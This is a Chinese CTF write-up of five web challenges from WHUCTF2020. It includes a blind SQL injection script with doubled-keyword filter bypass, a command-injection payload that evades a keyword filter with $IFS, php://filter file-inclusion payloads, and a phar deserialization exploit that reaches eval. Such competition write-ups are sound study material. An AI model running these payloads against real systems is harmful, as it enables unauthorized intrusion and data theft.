---
title: WHUCTF2020
date: 2020-05-24
image: https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120170745.jpeg
description: 
categories: 
- ctf_writeup
tags:
- SQLi
- phar
- RCE bypass
---
武汉大学的CTF，难的简单的都有，最近比赛是真滴多，打完金盆洗手了

------

### Easy_sqli

考点：bool盲注，双写绕过

简单，没啥好讲的

```
#wh1sper
import requests
host = 'http://218.197.154.9:10011/login.php#'
def mid(bot, top):
    return (int)(0.5 * (top + bot))
def sqli():
    name = ''
    for j in range(1, 250):
        top = 126
        bot = 32
        while 1:
            babyselect = '(seselectlect f111114g frfromom f1ag_y0u_wi1l_n3ver_kn0w)'#
            select = "1' oorr ascii(substr("+babyselect+",{},1))>{} #".format(j, mid(bot, top))
            data = {"user": select, "pass": "a"}
            r = requests.post(url=host, data=data)
            #print(data)
            if 'Login success!' in r.text:  # 成功
                if top - 1 == bot:  # top和bot相邻，说明name是top
                    name += chr(top)
                    print(name)
                    break
                bot = mid(bot, top)  # 成功就上移bot
            else:  # 失败
                if top - 1 == bot:  # top和bot相邻，加上失败，说明name是bot
                    name += chr(bot)
                    print(name)
                    break
                top = mid(bot, top)  # 失败就下移top
if __name__ == '__main__':
    sqli()
```

WHUCTF{r3lly_re11y_n0t_d1ffIcult_yet??~}

 

 

 

### ezphp

考点：%0a绕过preg_match、md5爆破、反序列化字符逃逸

都是原题：

```
<?php
error_reporting(0);
highlight_file(__file__);
$string_1 = $_GET['str1'];
$string_2 = $_GET['str2'];

//1st
if($_GET['num'] !== '23333' && preg_match('/^23333$/', $_GET['num'])){
    echo '1st ok'."<br>";
}
else{
    die('会代码审计嘛23333');
}


//2nd
if(is_numeric($string_1)){
    $md5_1 = md5($string_1);
    $md5_2 = md5($string_2);

    if($md5_1 != $md5_2){
        $a = strtr($md5_1, 'pggnb', '12345');
        $b = strtr($md5_2, 'pggnb', '12345');
        if($a == $b){
            echo '2nd ok'."<br>";
        }
        else{
            die("can u give me the right str???");
        }
    } 
    else{
        die("no!!!!!!!!");
    }
}
else{
    die('is str1 numeric??????');
}

//3nd
function filter($string){
    return preg_replace('/x/', 'yy', $string);
}

$username = $_POST['username'];

$password = "aaaaa";
$user = array($username, $password);

$r = filter(serialize($user));
if(unserialize($r)[1] == "123456"){
    echo file_get_contents('flag.php');
}
```

第一关，num=23333%0a，NCTF和MRCTF出现过

第二关，见本站[奇怪的MD5](http://wh1sper.com/常见0e开头的md5/)，理解strtr的功能，exp跑1分钟出，md5(11230178)=0e732639146814822596b49bb6939b97

第三关，反序列化字符逃逸，参考[miniLCTF](http://wh1sper.com/minil2020_web_wp/)、[安恒4月赛](http://wh1sper.com/fakephp反序列化字符逃逸/)

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120170758.png)

 

 

 

### ezcmd

考点：$IFS绕空格，\分割关键字，变量绕过flag匹配

```
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("no space!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("no flag");
  } else if(preg_match("/tac|rm|echo|cat|nl|less|more|tail|head/", $ip)){
    die("cat't read flag");
  }
  $a = shell_exec("ping -c 4 ".$ip); 
  echo "<pre>";
  print_r($a);
}
highlight_file(__FILE__);

?>
```

参考：https://cloud.tencent.com/developer/article/1599149

playload:

```
?ip=0.0.0.0;a=g;b=fla;ca\t$IFS$b$a.php
```

whuctf{11041f3d-3fbb-4dfd-8f27-31788300b54c}

 

 

 

### ezinclude

考点：文件包含参数爆破

打开题目，扫目录到了info.php，本来以为是临时文件包含，结果。。

在contact.php提交表单，跳转到/thankyou.php，里面看到了几个参数，直接爆破出file参数，

```
file=php://filter/read=convert.base64-encode/resource=flag.php
```

得到base64编码的flag

whuctf{N0w_y0u_kn0w_file_inclusion}

 

 

 

### Easy_unserialize

考点：文件包含、Phar反序列化

phar学习链接

\>>https://www.freebuf.com/column/198945.html

\>>https://paper.seebug.org/680/

题目名称是unserialize，不过打开却是一个文件上传页面，上传和反序列化结合的我只能想到phar反序列化，但是由于以前做题直接跳过了这个知识点，不够熟悉，比赛的时候出了一点小故障没做出来。

在主页的源码里面可以看到提示 `<!-- flag.php -->` ，分别访问 `upload.php` 和 `view.php` 然后回头看抓包，发现了有一个 `acti0n=upload` 和 `acti0n=view` 的302重定向，放到bp，用伪协议可以读取两个页面的源码：

```
?acti0n=pHp://Filter/read=convert.Base64-encode/resource=upload.php
?acti0n=pHp://Filter/read=convert.Base64-encode/resource=view.php
```

注意他过滤了一些关键字，需要大小写绕过。

 

得到了源码之后就是审计了，在 `upload.php` 里面也能看到这样一段：

```
if(preg_match('/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i', $extension) === 0) {
  die("<p align=\"center\">You can't upload this kind of file!</p>");
}
```

也间接（直接）暗示（明示）了我们phar的操作。

在view.php里面看到：

```
if (isset($_POST['show'])) {
  $file_name = $_POST['show'];
  $ins->show_img($file_name);
}
if (isset($_POST['delete'])) {
  $file_name = $_POST['delete'];
  $ins->delete_img($file_name);
}
```

转到声明：

```
  class View
  {
    public $dir;
    private $cmd;
    …………
    …………
    function show_img($file_name) {
      $name = $file_name;
      $width = getimagesize($name)[0];
      $height = getimagesize($name)[1];
      $times = $width / 200;
      $width /= $times;
      $height /= $times;
      $template = "
<img style=\"clear: both;display: block;margin: auto;\" src=\"$this->dir$name\" 
alt=\"$file_name\" width = \"$width\" height = \"$height\">
      ";
      echo $template;
    }

    function delete_img($file_name) {
      $name = $file_name;
      if (file_exists($name)) {
        @unlink($name);
        if(!file_exists($name)) {
          echo "<p align=\"center\" style=\"font-weight: bold;\">成功删除! 3s后跳转</p>";
          header("refresh:3;url=view.php");
        } else {
          echo "Can not delete!";
          exit;
        }
      } else {
        echo "<p align=\"center\" style=\"font-weight: bold;\">找不到这个文件! </p>";
      }
    }

    function __destruct() {
      eval($this->cmd);
    }
  }
```

`function delete_img` 里面有 `file_exists()` 可以触发phar反序列化，那么我们就开始构造phar文件：

```
<?php
class View
{
    public $dir;
    private $cmd = 'show_source("/var/www/html/flag.php");';
}
@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub
$o = new view();
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.jpg", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

由于upload里面ban了一些函数，题目又提示了flag.php，我们就直接show_source

运行，生成phar文件，上传。

在 `view.php` POST请求：

```
delete=phar://phar.phar
```

直接得到flag.php的源码

WHUCTF{Phar_1s_Very_d@nger0u5}